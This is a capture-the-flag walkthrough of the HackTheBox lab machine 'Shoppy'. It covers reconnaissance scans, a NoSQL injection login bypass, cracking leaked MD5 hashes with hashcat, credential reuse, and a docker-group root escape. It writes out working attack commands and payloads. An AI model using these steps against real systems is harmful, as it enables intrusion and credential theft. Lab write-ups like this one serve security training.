# Shoppy

### Machine IP
```
10.10.11.180
```

### nmap scan
Scanning for open ports and services
```
nmap -sC -sV -Pn -T4 10.10.11.180
```

Results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title:             Shoppy Wait Page        
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ports 22 (ssh) and 80 (http) are open!


### gobuster scan
Scanning for subdirectories
```
gobuster dir -w wordlists/dirbuster/directory-list-2.3-small.txt -u http://shoppy.htb
```

Results:
```
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/Login                (Status: 200) [Size: 1074]
/js                   (Status: 301) [Size: 171] [--> /js/]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/Admin                (Status: 302) [Size: 28] [--> /login]
```

### ffuf scan
Scanning for subdomains

```
sudo ffuf -c -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" --fc 301
```

Found one subdomain

```
mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 219ms]
```

### mattermost.shoppy.htb

Adding to /etc/hosts in vim:
```
10.10.11.180	shoppy.htb mattermost.shoppy.htb
```

Seems to be another login form...

### sqlmap
Scanning the login page:
```
sqlmap -r post.txt -p username --level 5 --risk 3 --threads 10
```

Connection times out...ineffective

### Manual sqli

Attempting a login with:
```
Username: admin' or 1=1 --
Password: admin
```

The username portion would resolve to:

```
SELECT * FROM users WHERE username = 'admin' OR 1=1-- ' 
```

...in the case of injection. The password really doesnt matter.


Page taking a long time to load...
Results in a 504 Gateway timeout

Let's try NoSQLi

### Manual NoSQLi

Attempting a login with:
```
Username: admin'||'1==1
Password: cheese
```

The username portion would resolve to:

```
INCOMPLETE
```

...in the case of injection. The password really doesnt matter.

RESULT! We are logged in!


### Exploring the Admin page
Weve been redirected to:
```
http://shoppy.htb/admin
```

Here, we can search for users. So let's search for "admin'||'1==1".

We get an exported json file with the information:
```
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
  },
  {
    "_id": "62db0e93d6d6a999a66ee67b",
    "username": "josh",
    "password": "6ebcea65320589ca4f2f1ce039975995"
  }
]
```

The passwords are stored as MD5 hashes...let crack them!

### Hashcat

Trying to crack the following hashes with hashcat...
```
23c6877d9e2b564ef8b32c3a23de27b2
6ebcea65320589ca4f2f1ce039975995
```

Command:

```
hashcat -m 0 -a 0 -o cracked_hashes hashes /usr/share/wordlists/rockyou.txt
```

`-m`: type of hash (0 represents MD5)

`-a`: type of attack (0 represents dictionary attack)

Complete...
cracked_hashes file:
```
6ebcea65320589ca4f2f1ce039975995:remembermethisway
```

This hash appears to be for user "josh"


### Back to mattermost.shoppy.htb

Trying to log in with:
```
User: josh
Password: remembermethisway
```
**Successful!**

### Exploring

On the mattermost site, we can find some interesting information:

> jaeger
4:22 AM
Hey @josh,
For the deploy machine, you can create an account with these creds :
username: jaeger
password: Sh0ppyBest@pp!
And deploy on it.

> josh
4:25 AM
Oh I forgot to tell you, that we're going to use docker for the deployment, so I will add it to the first deploy

So, we have a password and username for jaeger.

```
Username: jaeger
Password: Sh0ppyBest@pp!
```

### SSH

We can use the credentials we found to login via ssh:

```
ssh jaeger@10.10.11.180
password: Sh0ppyBest@pp!
```

On the machine, we find `user.txt`.

```
cat user.txt

8******************************4
```

### Enumeration

Listing files with privileges:

```
sudo -l

Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

This means we can run password-manager with user set to "deploy".

Exploring the `/home/deploy` folder, we find the following 3 files:

```
creds.txt  password-manager  password-manager.cpp
```

Let's try running the password-manager...

```
sudo -u deploy ./password-manager

Welcome to Josh password manager!
Please enter your master password: test
Access denied! This incident will be reported !
```

Well, that didn't work...

Unfortunately, we also can't cat out the `creds.txt` or `password-manager.cpp` files.
However, we can cat out the `password-manager` file itself!

```
<binary data>
...
...
Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !
...
...
<binary data>
```

This leads to us finding `Sample` as the master password! Let's try it out:

```
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

Awesome!

### SSH (deploy)

Logging in as deploy...

We can run an id search

```
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

We see a `docker` group!

[GTFObins tells us that be can run docker to gain root shell with...](https://gtfobins.github.io/gtfobins/docker/)

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
#
```

We then see that beautiful `#`. We are root!

Lets cat the root flag!

```
cat root/root.txt
4******************************b
```

**Shoppy: PWNED**
